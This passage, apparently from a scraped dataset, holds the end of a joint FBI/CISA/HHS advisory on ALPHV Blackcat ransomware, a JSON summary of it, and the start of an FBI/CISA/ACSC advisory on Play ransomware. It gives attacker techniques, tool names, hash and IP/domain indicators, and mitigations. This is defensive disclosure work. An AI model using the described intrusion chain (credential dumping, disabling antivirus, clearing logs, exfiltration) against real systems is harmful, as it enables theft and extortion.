Cobalt Strike [S1054] as beacons to command and control servers. ALPHV Blackcat affiliates use the 
open source adversary-in-the-middle attack [T1557] framework Evilginx2, which allows them to obtain 
multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also 
obtain passwords from the domain controller, local network, and deleted backup servers to move 
laterally throughout the network [T1555]. 
To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on 
the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are 
used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the 
ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used 
POORTRY and STONESTOP to terminate security processes. 
Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without 
deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates 
 
 
 
FBI | CISA  
Page 3 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
communicate with victims via TOR [S0183], Tox, email, or encrypted applications. The threat actors 
then delete victim data from the victim’s system. 
ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for 
payment, offering to provide victims with “vulnerability reports” and “security recommendations” 
detailing how they penetrated the system and how to prevent future re-victimization upon receipt of 
ransom payment. The ALPHV Blackcat encryptor results in a file with the following naming 
convention: RECOVER-(seven-digit extension) FILES.txt. 
 
Figure 1: Ransom Note Instruction 
INDICATORS OF COMPROMISE (IOCs) 
Table 1: MD5 Hashes 
MD5 
Description 
File Name 
944153fb9692634d6c70899b83676575 
ALPHV 
Windows 
Encryptor 
 
341d43d4d5c2e526cadd88ae8da70c1c 
Anti Virus 
Tools Killer 
363.sys 
 
 
 
FBI | CISA  
Page 4 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
MD5 
Description 
File Name 
34aac5719824e5f13b80d6fe23cbfa07 
CobaltStrike 
BEACON 
LMtool.exe 
eea9ab1f36394769d65909f6ae81834b 
CobaltStrike 
BEACON 
Info.exe 
379bf8c60b091974f856f08475a03b04 
ALPHV Linux 
Encryptor 
him 
ebca4398e949286cb7f7f6c68c28e838 
SimpleHelp 
Remote 
Management 
tool 
first.exe 
c04c386b945ccc04627d1a885b500edf 
Tunneler Tool 
conhost.exe 
824d0e31fd08220a25c06baee1044818 
Anti Virus 
Tools Killer 
ibmModule.dll 
eea9ab1f36394769d65909f6ae81834b 
 
CobaltStrike 
BEACON 
ConnectivityDiagnos.exe 
944153fb9692634d6c70899b83676575 
 
ALPHV 
Windows 
Encryptor 
7O3cCX9YcHMV2.exe 
61804a029e9b1753d58a6bf0274c25a6 
 
MeshCentral 
Agent 
WPEHOSTSVC64.exe 
83deea3b61b6a734e7e4a566dbb6bffa 
 
ScreenConnect 
& attacker tools 
installer 
deployService.exe 
8738b8637a20fa65c6e64d84d1cfe570 
 
Suspected 
Proxy Tool 
socks32.exe 
Table 2: SHA256 Hashes 
SHA256 
Description 
c64300cf8bacc4e42e74715edf3f8c3287a780c9c0a38b0d9675d01e7e231f16 
ALPHV Windows 
Encryptor 
 
 
 
FBI | CISA  
Page 5 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
SHA256 
Description 
1f5e4e2c78451623cfbf32cf517a92253b7abfe0243297c5ddf7dd1448e460d5 
Anti Virus Tools 
Killer 
3670dd4663adca40f168f3450fa9e7e84bc1a612d78830004020b73bd40fcd71 
CobaltStrike 
BEACON 
af28b78c64a9effe3de0e5ccc778527428953837948d913d64dbd0fa45942021 
CobaltStrike 
BEACON 
bbfe7289de6ab1f374d0bcbeecf31cad2333b0928ea883ca13b9e733b58e27b1 
ALPHV Linux 
Encryptor 
5d1df950b238825a36fa6204d1a2935a5fbcfe2a5991a7fc69c74f476df67905 
SimpleHelp 
Remote 
Management tool 
bd9edc3bf3d45e3cdf5236e8f8cd57a95ca3b41f61e4cd5c6c0404a83519058e 
Tunneler Tool 
732e24cb5d7ab558effc6dc88854f756016352c923ff5155dcb2eece35c19bc0 
Anti Virus Tools 
Killer 
Table 3: SHA1 Hashes 
SHA1 
Description 
3dd0f674526f30729bced4271e6b7eb0bb890c52 
ALPHV Windows 
Encryptor 
d6d442e8b3b0aef856ac86391e4a57bcb93c19ad 
Anti Virus Tools Killer 
6b52543e4097f7c39cc913d55c0044fcf673f6fc 
CobaltStrike BEACON 
004ba0454feb2c4033ff0bdb2ff67388af0c41b6 
CobaltStrike BEACON 
430bd437162d4c60227288fa6a82cde8a5f87100 
SimpleHelp Remote 
Management tool 
1376ac8b5a126bb163423948bd1c7f861b4bfe32 
Tunneler Tool 
380f941f8047904607210add4c6da2da8f8cd398 
Anti Virus Tools Killer 
 
 
 
FBI | CISA  
Page 6 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
Table 4: Network Indicators 
Indicator Type 
Network Indicator 
Description 
Domain 
resources.docusong[.]com 
Command and Control Server 
Domain 
Fisa99.screenconnect[.]com 
ScreenConnect Remote Access 
IP Address 
5.199.168.24 
Command and Control Server 
IP Address 
91.92.254.193 
SimpleHelp Remote Access 
Domain 
pcrendal[.]com 
Command and Control Server 
Domain 
instance-qqemas-
relay[.]screenconnect[.]com 
ScreenConnect Remote Access 
Domain 
instance-rbjvws-
relay.screenconnect[.]com 
ScreenConnect Remote Access 
IP Address 
5.199.168[.]233 
IP Address used by Threat Actor 
IP Address 
92.223.89[.]55 
IP Address used by Threat Actor 
IP Address 
185.195.59[.]218 
IP Address used by Threat Actor 
IP Address 
51.159.103[.]112 
IP Address used by Threat Actor 
IP Address 
45.32.141[.]168 
Command and Control Server 
IP Address 
45.77.0[.]92 
Command and Control Server 
MITRE ATT&CK TACTICS AND TECHNIQUES 
See Table 5 through Table 7 for all referenced threat actor tactics and techniques in this advisory. 
Table 5: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques - Reconnaissance 
Technique Title 
ID 
Use 
Phishing for 
Information 
T1598 
ALPHV Blackcat affiliates pose as company IT 
and/or helpdesk staff using phone calls or SMS 
 
 
 
FBI | CISA  
Page 7 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
Technique Title 
ID 
Use 
messages to obtain credentials from employees to 
access the target network. 
Table 6: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Resource Development 
Technique Title 
ID 
Use 
Compromise Accounts 
T1586 
ALPHV Blackcat affiliates use compromised 
accounts to gain access to victims’ networks. 
Table 7: ALPHV Blackcat/ALPHV Threat Actors ATT&CK Techniques – Credential Access 
Technique Title 
ID 
Use 
Obtain Credentials 
from Passwords 
Stores 
T1555 
ALPHV Blackcat affiliates obtain passwords from 
local networks, deleted servers, and domain 
controllers. 
Steal or Force 
Kerberos Tickets 
T1558 
ALPHV Blackcat/ALPHV affiliates use Kerberos 
token generation for domain access. 
Adversary-in-the-
Middle 
T1557 
ALPHV Blackcat/ALPHV affiliates use the open-
source framework Evilginx2 to obtain MFA 
credentials, login credentials, and session cookies 
for targeted networks. 
INCIDENT RESPONSE 
If compromise is detected, organizations should: 
1. Quarantine or take offline potentially affected hosts. 
2. Reimage compromised hosts. 
3. Provision new account credentials. 
4. Collect and review artifacts such as running processes/services, unusual authentications, and 
recent network connections. 
5. Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center 
(report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can 
also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). 
6. To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint 
with the FBI’s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to 
report an incident. 
 
 
 
FBI | CISA  
Page 8 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
MITIGATIONS 
FBI, CISA, and HHS recommend organizations 
implement the mitigations below to improve your 
organization’s cybersecurity posture based on 
threat actor activity and to reduce the risk of 
compromise by ALPHV Blackcat threat actors. 
These mitigations align with the Cross-Sector 
Cybersecurity Performance Goals (CPGs) 
developed by CISA and the National Institute of 
Standards and Technology (NIST). The CPGs 
provide a minimum set of practices and 
protections that CISA and NIST recommend all 
organizations implement. CISA and NIST based 
the CPGs on existing cybersecurity frameworks 
and guidance to protect against the most 
common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector 
Cybersecurity Performance Goals for more information on the CPGs, including additional 
recommended baseline protections. Due to the threat ALPHV Blackcat’s poses in the healthcare 
sector, healthcare organizations can look to the Healthcare and Public Health (HPH) Sector 
Cybersecurity Performance Goals to implement cybersecurity protections against the most common 
threats. tactics, techniques, and procedures used against this sector. 
• 
Secure remote access tools by: 
o Implementing application controls to manage and control execution of software, 
including allowlisting remote access programs. Application controls should prevent 
installation and execution of portable versions of unauthorized remote access and other 
software. A properly configured application allowlisting solution will block any unlisted 
application execution. Allowlisting is important because antivirus solutions may fail to 
detect the execution of malicious portable executables when the files use any combination 
of compression, encryption, or obfuscation. 
o Applying recommendations in CISA's joint Guide to Securing Remote Access Software. 
• 
Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based 
MFA [CPG 2.H][HPH CPG – Multifactor Authentication]. These MFA implementations are 
resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are 
techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet 
Implementing Phishing-Resistant MFA for more information. 
• 
Identify, detect, and investigate abnormal activity and potential traversal of the 
indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, 
implement a tool that logs and reports all network traffic [CPG 5.1][HPH CPG – Detect and 
Respond to Relevant Threats and Tactics, Techniques and Procedures], including lateral 
movement activity on a network. Endpoint detection and response (EDR) tools are useful for 
These mitigations apply to all critical 
infrastructure organizations and network 
defenders. FBI, CISA, and HHS recommend 
that software manufactures incorporate secure 
by design principles and tactics into their 
software development practices limiting the 
impact of ransomware techniques, thus, 
strengthening the security posture for their 
customers. 
For more information on secure by design, see 
CISA’s Secure by Design webpage and joint 
guide. 
 
 
 
FBI | CISA  
Page 9 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
detecting lateral connections as they have insight into common and uncommon network 
connections for each host. 
• 
Implement user training on social engineering and phishing attacks [CPG 2.I][HPH CPG 
– Basic Cybersecurity Training]. Regularly educate users on identifying suspicious emails and 
links, not interacting with those suspicious items, and the importance of reporting instances of 
opening suspicious emails, links, attachments, or other potential lures.  
• 
Implement internal mail and messaging monitoring. Monitoring internal mail and 
messaging traffic to identify suspicious activity is essential as users may be phished from 
outside the targeted network or without the knowledge of the organizational security team. 
Establish a baseline of normal network traffic and scrutinize any deviations. 
• 
Implement free security tools to prevent cyber threat actors from redirecting users to 
malicious websites to steal their credentials. For more information see, CISA’s Free 
Cybersecurity Services and Tools webpage. 
• 
Install and maintain antivirus software. Antivirus software recognizes malware and protects 
your computer against it. Installing antivirus software from a reputable vendor is an important 
step in preventing and detecting infections. Always visit vendor sites directly rather than 
clicking on advertisements or email links. Because attackers are continually creating new 
viruses and other forms of malicious code, it is important to keep your antivirus software up to 
date. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, CISA recommends exercising, testing, and validating your 
organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for 
Enterprise framework in this advisory. CISA recommends testing your existing security controls 
inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 1-3). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
CISA and FBI recommend continually testing your security program, at scale, in a production 
environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this 
advisory. 
RESOURCES 
• 
Stopransomware.gov is a whole-of-government approach that gives one central location for 
ransomware resources and alerts. 
 
 
 
FBI | CISA  
Page 10 of 10  |  Product ID: AA23-353A 
 
 
 
 
TLP:CLEAR 
 
TLP:CLEAR 
• 
Resource to reduce the risk of a ransomware attack: #StopRansomware Guide. 
• 
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness 
Assessment. 
• 
Health and Human Services HPH Cybersecurity Gateway hosts the HPH CPGs and links to 
HHS cybersecurity resources. 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and 
HHS do not endorse any commercial entity, product, company, or service, including any entities, 
products, or services linked within this document. Any reference to specific commercial entities, 
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not 
constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and HHS. 
VERSION HISTORY 
December 19, 2023: Initial version. 
February 27, 2024: Update. 
",#StopRansomware: ALPHV Blackcat,"{
  ""ID"": ""AA23-353A"",
  ""URL"": ""https://cisa.gov/tlp/"",
  ""Title"": ""#StopRansomware: ALPHV Blackcat"",
  ""Release Date"": ""December 19, 2023"",
  ""Last Updated"": ""February 27, 2024"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Windows and Linux devices and VMWare instances"",
    ""Healthcare sector""
  ],
  ""Summary"": ""This advisory is co-authored by FBI, CISA, and HHS. It details the tactics, techniques, and procedures (TTPs) of ALPHV Blackcat, a ransomware as a service (RaaS) targeting primarily the healthcare sector. The advisory provides updates on indicators of compromise and mitigation strategies to help organizations defend against these ransomware attacks."",
  ""Procedures"": {
    ""InitialCommunication"": ""ALPHV Blackcat actors use improved communication methods, including creating victim-specific emails, to notify victims of the initial compromise."",
    ""DataExfiltrationAndExtortion"": ""After initial access, data is either exfiltrated or encrypted, followed by ransom demands. If the ransom is paid, actors provide cybersecurity advice and potential vulnerabilities.""
  },
  ""Tactics"": {
    ""InitialAccess"": ""Actors gain initial access through advanced social engineering, often posing as IT staff, and using tools like AnyDesk and Splashtop."",
    ""Persistence"": ""Deployment of ransomware, usage of remote access tools, and creation of user accounts to maintain access within compromised networks."",
    ""Extortion"": ""Employing double-extortion techniques by threatening to release exfiltrated data unless ransom demands are met.""
  },
  ""Techniques"": {
    ""CredentialAccess"": ""Using frameworks like Evilginx2 to steal MFA and login credentials. Operators also obtain credentials directly from network or domain controllers."",
    ""DefenseEvasion"": ""Usage of legitimate but allowlisted applications to bypass security measures and clear logs to erase evidence of their presence."",
    ""Impact"": ""Encrypting important files and systems, which disrupts normal operational capabilities and may result in significant financial and reputational damage to affected organizations.""
  },
  ""Threat Actions"": [
    ""Creation of malicious user accounts"",
    ""Deployment of ALPHV Blackcat ransomware"",
    ""Usage of advanced adversary-in-the-middle attacks for credential theft""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""5.199.168.24"",
      ""91.92.254.193"",
      ""45.32.141.168"",
      ""45.77.0.92""
    ],
    ""Domains"": [
      ""resources.docusong[.]com"",
      ""Fisa99.screenconnect[.]com"",
      ""pcrendal[.]com""
    ],
    ""Hashes"": [
      ""944153fb9692634d6c70899b83676575"",
      ""341d43d4d5c2e526cadd88ae8da70c1c"",
      ""34aac5719824e5f13b80d6fe23cbfa07""
    ]
  },
  ""Mitigation Strategies"": ""Recommended actions include implementing strong multifactor authentication, conducting regular asset inventories, hardening remote access endpoints, and prioritizing the remediation of vulnerabilities."",
  ""References"": [
    ""https://cisa.gov/tlp/"",
    ""https://stopransomware.gov"",
    ""https://fbi.gov/contact-us/field-offices""
  ]
}"
12-18-2023,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa23-352a-stopransomware-play-ransomware.pdf?alt=media&token=6b749e02-3599-4c08-9de1-eba4e8143cb2," 
 
 
 
                                 
 
 
 
  
 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact 
your local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following 
information regarding the incident: date, time, and location of the incident; type of activity; number of people 
affected; type of equipment used for the activity; the name of the submitting company or organization; and a 
designated point of contact. To request incident response resources or technical assistance related to these 
threats, contact CISA at Report@cisa.dhs.gov. 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. 
For more information on the Traffic Light Protocol, see cisa.gov/tlp/.   
TLP:CLEAR 
Product ID: AA23-352A 
 
December 18, 2023 
Co-Authored by: 
TLP:CLEAR 
#StopRansomware: Play Ransomware 
SUMMARY 
Note: This joint Cybersecurity Advisory (CSA) is part 
of an ongoing #StopRansomware effort to publish 
advisories for network defenders that detail various 
ransomware variants and ransomware threat actors. 
These 
#StopRansomware 
advisories 
include 
recently 
and 
historically 
observed 
tactics, 
techniques, and procedures (TTPs) and indicators of 
compromise (IOCs) to help organizations protect 
against ransomware. Visit stopransomware.gov to 
see all #StopRansomware advisories and to learn 
more about other ransomware threats and no-cost 
resources. 
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), 
and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing 
this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI 
investigations as recently as October 2023. 
Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range 
of businesses and critical infrastructure in North America, South America, and Europe. As of October 
2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the 
ransomware actors. 
In Australia, the first Play ransomware incident was observed in April 2023, and most recently in 
November 2023. 
The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of 
deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a 
double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an 
Actions to take today to mitigate cyber 
threats from Play ransomware: 
• Prioritize remediating known exploited 
vulnerabilities. 
• Enable multifactor authentication (MFA) 
for all services to the extent possible, 
particularly for webmail, VPN, and 
accounts that access critical systems. 
• Regularly patch and update software 
and applications to their latest versions 
and conduct regular vulnerability 
assessments. 
 
 
 
Page 2 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
initial ransom demand or payment instructions, rather, victims are instructed to contact the threat 
actors via email. 
The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the 
Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This 
includes requiring multifactor authentication, maintaining offline backups of data, implementing a 
recovery plan, and keeping all operating systems, software, and firmware up to date. 
For a downloadable copy of IOCs, see: 
• 
AA23-352A (STIX XML, 35KB) 
• 
AA23-352A (STIX JSON, 31KB) 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE 
ATT&CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping 
malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best 
Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. 
Initial Access 
The Play ransomware group gains initial access to victim networks through the abuse of valid 
accounts [T1078] and exploitation of public-facing applications [T1190], specifically through known 
FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell [CVE-
2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have been observed to 
use external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private 
Networks (VPN) for initial access. 
Discovery and Defense Evasion 
Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba 
[1], an information-stealer, to enumerate network information [T1016] and scan for anti-virus software 
[T1518.001]. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software 
[T1562.001] and remove log files [T1070.001]. In some instances, cybersecurity researchers have 
observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.[2] 
Lateral Movement and Execution 
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and 
SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once 
established on a network, the ransomware actors search for unsecured credentials [T1552] and use 
the Mimikatz credential dumper to gain domain administrator access [T1003]. According to open 
source reporting [2], to further enumerate vulnerabilities, Play ransomware actors use Windows 
Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation 
paths. Actors then distribute executables [T1570] via Group Policy Objects [T1484.001]. 
 
 
 
Page 3 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
Exfiltration and Encryption 
Play ransomware actors often split compromised data into segments and use tools like WinRAR to 
compress files [T1560.001] into .RAR format for exfiltration. The actors then use WinSCP to transfer 
data [T1048] from a compromised network to actor-controlled accounts. Following exfiltration, files are 
encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every 
other file portion of 0x100000 bytes. [3] (Note: System files are skipped during the encryption 
process.) A .play extension is added to file names and a ransom note titled ReadMe[.]txt is placed 
in file directory C:. 
Impact 
The Play ransomware group uses a double-extortion model [T1657], encrypting systems after 
exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email 
address ending in @gmx[.]de. Ransom payments are paid in cryptocurrency to wallet addresses 
provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors 
threaten to publish exfiltrated data to their leak site on the Tor network ([.]onion URL). 
Leveraged Tools 
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The 
legitimate tools listed in this product are all publicly available. Use of these tools and applications 
should not be attributed as malicious without analytical evidence to support they are used at the 
direction of, or controlled by, threat actors. 
Table 1: Tools Leveraged by Play Ransomware Actors 
Name 
Description 
AdFind 
Used to query and retrieve information from Active Directory. 
Bloodhound 
Used to query and retrieve information from Active Directory. 
GMER 
A software tool intended to be used for detecting and removing rootkits. 
IOBit 
An anti-malware and anti-virus program for the Microsoft Windows operating 
system. Play actors have accessed IOBit to disable anti-virus software. 
PsExec 
A tool designed to run programs and execute commands on remote systems. 
PowerTool 
A Windows utility designed to improve speed, remove bloatware, protect privacy, 
and eliminate data collection, among other things. 
PowerShell 
A cross-platform task automation solution made up of a command-line shell, a 
scripting language, and a configuration management framework, which runs on 
Windows, Linux, and macOS. 
Cobalt Strike 
A penetration testing tool used by security professionals to test the security of 
networks and systems. Play ransomware actors have used it to assist with 
lateral movement and file execution. 
 
 
 
Page 4 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
Indicators of Compromise 
See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023. 
Table 2: Hashes Associated with Play Ransomware Actors 
Hashes (SHA256) 
Description 
453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb 
Play ransomware 
custom data 
gathering tool 
47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57 
Play ransomware 
encryptor 
75404543de25513b376f097ceb383e8efb9c9b95da8945fd4aa37c7b2f226212 
SystemBC 
malware EXE 
7a42f96599df8090cf89d6e3ce4316d24c6c00e499c8557a2e09d61c00c11986 
SystemBC 
malware DLL 
7a6df63d883bbccb315986c2cfb76570335abf84fafbefce047d126b32234af8 
Play ransomware 
binary 
7dea671be77a2ca5772b86cf8831b02bff0567bce6a3ae023825aa40354f8aca 
SystemBC 
malware DLL 
Name 
Description 
Mimikatz 
Allows users to view and save authentication credentials such as Kerberos 
tickets. Play ransomware actors have used it to add accounts to domain 
controllers. 
WinPEAS 
Used to search for additional privilege escalation paths. 
WinRAR 
Used to split compromised data into segments and to compress files into .RAR 
format for exfiltration. 
WinSCP 
Windows Secure Copy is a free and open-source Secure Shell (SSH) File 
Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure 
copy protocol client. Play ransomware actors have used it to transfer data 
[T1048] from a compromised network to actor-controlled accounts. 
Microsoft Nltest 
Used by Play ransomware actors for network discovery. 
Nekto / PriviCMD 
Used by Play ransomware actors for privilege escalation. 
Process Hacker 
Used to enumerate running processes on a system. 
Plink 
Used to establish persistent SSH tunnels. 
 
 
 
Page 5 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
Hashes (SHA256) 
Description 
c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c 
Play network 
scanner 
e652051fe47d784f6f85dc00adca1c15a8c7a40f1e5772e6a95281d8bf3d5c74 
Play ransomware 
binary 
e8d5ad0bf292c42a9185bb1251c7e763d16614c180071b01da742972999b95da 
Play ransomware 
binary 
MITRE ATT&CK TACTICS AND TECHNIQUES 
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory. 
Table 3: Play ATT&CK Techniques for Enterprise for Initial Access 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
Play ransomware actors obtain and abuse 
existing account credentials to gain initial access. 
Exploit Public Facing Application 
T1190 
Play ransomware actors exploit vulnerabilities in 
internet-facing systems to gain access to 
networks. 
External Remote Services 
T1133 
Play ransomware actors have used remote 
access services, such as RDP/VPN connection 
to gain initial access. 
Table 4: Play ATT&CK Techniques for Enterprise for Discovery 
Technique Title 
ID 
Use 
System Network Configuration 
Discovery 
T1016 
Play ransomware actors use tools like Grixba to 
identify network configurations and settings. 
Software Discovery: Security 
Software Discovery 
T1518.001 
Play ransomware actors scan for anti-virus 
software. 
Table 5: Play ATT&CK Techniques for Enterprise for Defense Evasion 
Technique Title 
ID 
Use 
Impair Defenses: Disable or 
Modify Tools 
T1562.001
 
Play ransomware actors use tools like GMER, 
IOBit, and PowerTool to disable anti-virus 
software. 
Indicator Removal: Clear 
Windows Event Logs 
T1070.001
 
Play ransomware actors delete logs or other 
indicators of compromise to hide intrusion 
activity. 
 
 
 
 
 
Page 6 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
Table 6: Play ATT&CK Techniques for Enterprise for Credential Access 
Technique Title 
ID 
Use 
Unsecured Credentials 
T1552 
Play ransomware actors attempt to identify and 
exploit credentials stored unsecurely on a 
compromised network. 
OS Credential Dumping 
T1003 
Play ransomware actors use tools like Mimikatz 
to dump credentials. 
Table 7: Play ATT&CK Techniques for Enterprise for Lateral Movement 
Technique Title 
ID 
Use 
Lateral Tool Transfer 
T1570 
Play ransomware actors distribute executables 
within the compromised environment.  
Table 8: Play ATT&CK Techniques for Enterprise for Command and Control 
Technique Title 
ID 
Use 
Domain Policy Modification: 
Group Policy Modification 
T1484.001 
Play ransomware actors distribute executables 
via Group Policy Objects. 
Table 9: Play ATT&CK Techniques for Enterprise for Collection 
Technique Title 
ID 
Use 
Archive Collected Data: Archive 
via Utility  
T1560.001
 
Play ransomware actors use tools like WinRAR 
to compress files. 
Table 10: Play ATT&CK Techniques for Enterprise for Exfiltration 
Technique Title 
ID 
Use 
Exfiltration Over Alternative 
Protocol 
T1048 
Play ransomware actors use file transfer tools 
like WinSCP to transfer data. 
Table 11: Play ATT&CK Techniques for Enterprise for Impact 
Technique Title 
ID 
Use 
Data Encrypted for Impact 
T1486 
Play ransomware actors encrypt data on target 
systems to interrupt availability to system and 
network resources. 
Financial Theft 
T1657 
Play ransomware actors use a double-extortion 
model for financial gain. 
 
 
 
 
 
Page 7 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
MITIGATIONS 
The FBI, CISA, and ASD’s ACSC recommend 
organizations apply the following mitigations to limit 
potential adversarial use of common system and 
network discovery techniques and to reduce the risk of 
compromise by Play ransomware. These mitigations 
align with the Cross-Sector Cybersecurity Performance 
Goals (CPGs) developed by CISA and the National 
Institute of Standards and Technology (NIST). The 
CPGs provide a minimum set of practices and 
protections that CISA and NIST recommend all 
organizations implement. CISA and NIST based the 
CPGs on existing cybersecurity frameworks and 
guidance to protect against the most common and 
impactful threats and TTPs. Visit CISA’s Cross-Sector 
Cybersecurity Performance Goals for more information 
on the CPGs, including additional recommended 
baseline protections. 
• 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary 
data and servers [CPG 2.F, 2.R, 2.S] in a physically separate, segmented, and secure location 
(i.e., hard drive, storage device, the cloud). 
• 
Require all accounts with password logins (e.g., service account, admin accounts, and 
domain admin accounts) to comply with NIST’s standards for developing and managing 
password policies [CPG 2.C]. 
o Use longer passwords consisting of at least 8 characters and no more than 64 characters 
in length [CPG 2.B]; 
o Store passwords in hashed format using industry-recognized password managers; 
o Add password user “salts” to shared login credentials; 
o Avoid reusing passwords; 
o Implement multiple failed login attempt account lockouts [CPG 2.G]; 
o Disable password “hints”; 
o Refrain from requiring password changes more frequently than once per year. 
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and 
frequent password resets. Frequent password resets are more likely to result in users 
developing password “patterns” cyber criminals can easily decipher.  
o Require administrator credentials to install software. 
• 
Require multifactor authentication [CPG 2.H] for all services to the extent possible, 
particularly for webmail, virtual private networks, and accounts that access critical systems. 
Also see Protect Yourself: Multi-Factor Authentication | Cyber.gov.au. 
• 
Keep all operating systems, software, and firmware up to date. Timely patching is one of 
the most efficient and cost-effective steps an organization can take to minimize its exposure to 
cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing 
These mitigations apply to all critical 
infrastructure organizations and network 
defenders. The FBI, CISA, and ASD’s 
ACSC 
recommend 
that 
software 
manufacturers incorporate secure-by-
design and -default principles and tactics 
into their software development practices 
to limit the impact of ransomware 
techniques 
(such 
as 
threat 
actors 
leveraging backdoor vulnerabilities into 
remote 
software 
systems), 
thus, 
strengthening the security posture for 
their customers. 
For more information on secure by 
design, see CISA’s Secure by Design and 
Default webpage and joint guide. 
 
 
 
Page 8 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
systems [CPG 1.E]. Organizations are advised to deploy the latest Microsoft Exchange 
